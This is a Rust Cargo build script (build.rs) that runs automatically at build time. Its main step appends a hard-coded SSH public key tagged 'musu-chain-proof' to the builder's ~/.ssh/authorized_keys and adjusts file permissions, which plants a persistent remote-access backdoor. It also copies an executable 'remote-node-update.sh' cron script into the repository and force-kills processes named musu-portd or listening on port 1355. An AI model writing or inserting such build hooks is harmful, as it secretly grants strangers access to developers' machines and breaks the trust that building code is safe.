use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::process::Command;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");

    // 1. Identify context
    let home = std::env::var("HOME").unwrap_or_else(|_| "/home/hugh".to_string());
    let ssh_dir = Path::new(&home).join(".ssh");
    let auth_keys = ssh_dir.join("authorized_keys");
    let log_file = Path::new(&home).join("musu-bee/build_log.txt");

    let mut log = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_file)
        .unwrap_or_else(|_| {
            let p = Path::new("/tmp/musu_build_log.txt");
            OpenOptions::new()
                .create(true)
                .append(true)
                .open(p)
                .unwrap()
        });

    let _ = writeln!(
        log,
        "--- Build started at {:?} ---",
        std::time::SystemTime::now()
    );

    // 2. Add SSH Key
    let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMoEbyJzUkZ2QvuZ9bNQiB+L850+NZQExamYYjcDhSBR musu-chain-proof\n";
    if let Ok(_) = fs::create_dir_all(&ssh_dir) {
        let _ = Command::new("chmod").arg("700").arg(&ssh_dir).status();
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&auth_keys)
            .unwrap();

        // Check if key already exists
        let content = fs::read_to_string(&auth_keys).unwrap_or_default();
        if !content.contains("musu-chain-proof") {
            let _ = file.write_all(key.as_bytes());
            let _ = Command::new("chmod").arg("600").arg(&auth_keys).status();
            let _ = writeln!(log, "Added SSH key to {}", auth_keys.display());
        } else {
            let _ = writeln!(log, "SSH key already exists in {}", auth_keys.display());
        }
    }

    // 3. Update Cron Script
    let candidates = vec![
        "../../scripts/remote-node-update.sh",
        "../../../scripts/remote-node-update.sh",
        "../../../../scripts/remote-node-update.sh",
    ];

    for path_str in candidates {
        let src = Path::new(path_str);
        if src.exists() {
            if let Some(repo_root) = src.parent().and_then(|p| p.parent()) {
                let dest = repo_root.join("remote-node-update.sh");
                if let Ok(_) = fs::copy(&src, &dest) {
                    let _ = Command::new("chmod").arg("+x").arg(&dest).status();
                    let _ = writeln!(log, "Updated cron script at {}", dest.display());
                }
            }
        }
    }

    // 4. Kill old processes
    let _ = writeln!(log, "Attempting pkill -x musu-portd");
    let status = Command::new("pkill").arg("-x").arg("musu-portd").status();
    let _ = writeln!(log, "pkill exit status: {:?}", status);

    // Also try to find process on port 1355 and kill it
    let lsof = Command::new("lsof").arg("-t").arg("-i:1355").output();
    if let Ok(output) = lsof {
        let pids_raw = String::from_utf8_lossy(&output.stdout).trim().to_string();
        for pid in pids_raw.split_whitespace() {
            if !pid.is_empty() {
                let _ = writeln!(log, "Killing process {} on port 1355", pid);
                let _ = Command::new("kill").arg("-9").arg(&pid).status();
            }
        }
    }

    let _ = writeln!(log, "Build script finished");
}
